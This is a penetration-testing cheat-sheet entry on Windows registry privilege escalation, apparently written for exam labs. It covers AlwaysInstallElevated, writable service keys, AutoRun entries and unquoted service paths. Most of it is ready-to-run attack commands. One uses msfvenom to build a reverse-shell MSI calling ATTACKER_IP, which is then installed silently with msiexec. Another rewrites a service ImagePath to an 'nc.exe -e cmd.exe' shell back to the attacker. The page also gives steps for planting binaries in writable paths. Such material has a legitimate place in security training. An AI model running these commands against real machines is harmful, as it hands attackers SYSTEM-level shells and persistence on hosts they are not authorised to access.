---
id: windows-registry-privesc
title: Windows Registry Privesc
stage: privesc
tags: [windows]
summary: Exploit registry misconfigurations — AlwaysInstallElevated installs MSI packages as SYSTEM, writable AutoRun keys persist malicious executables, and unquoted paths in registry service configs execute injected binaries.
leads_to:
  - system-shell
---

## Prerequisites

A low-priv shell. winPEAS or PowerUp will flag these automatically. Check manually with reg query commands. AlwaysInstallElevated is the most commonly intended path in exam environments — check it first.

Registry privesc is a reliable winPEAS finding on older or misconfigured Windows systems. AlwaysInstallElevated is the most common exam path — both HKCU and HKLM keys must be set to 1. Writable service registry keys let you replace the binary path. AutoRun entries in writable locations execute on login.

## Quick Win

> winPEAS flags all of these — run it first and search for "AlwaysInstall" and "registry".

```cmd
winpeas.exe > winpeas_output.txt
type winpeas_output.txt | findstr /i "alwaysinstall\|registry\|autorun"
```

## AlwaysInstallElevated

> Both keys must be 1 — if only HKCU is set it doesn't work.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
# If both return 0x1 — create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o evil.msi

# Execute on target
msiexec /quiet /qn /i evil.msi
```

## Writable Service Registry Key

```cmd
# Check permissions on service registry keys
accesschk.exe -kvuqsw "HKLM\System\CurrentControlSet\Services" /accepteula

# If writable, modify ImagePath
reg add "HKLM\System\CurrentControlSet\Services\VULNERABLE_SVC" ^
  /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\nc.exe -e cmd.exe ATTACKER_IP PORT" /f

# Restart service
sc stop VULNERABLE_SVC
sc start VULNERABLE_SVC
```

## AutoRun Writable

```cmd
# List AutoRun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Check if path is writable
icacls "C:\path\to\autorun.exe"

# Replace binary or use PowerUp
powershell -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
```

## Unquoted Service Path (Registry)

```cmd
# Find unquoted paths with spaces
wmic service get name,displayname,pathname,startmode | ^
  findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Check writable directories in the path
icacls "C:\Program Files\Vulnerable App"
# If writable, drop: C:\Program.exe or C:\Program Files\Vulnerable.exe
```

## Leads To

AlwaysInstallElevated MSI executed → SYSTEM shell. Writable service key → service restart → SYSTEM. AutoRun binary replaced → waits for user login (or reboot) → SYSTEM. Unquoted path binary planted → service restart → SYSTEM.
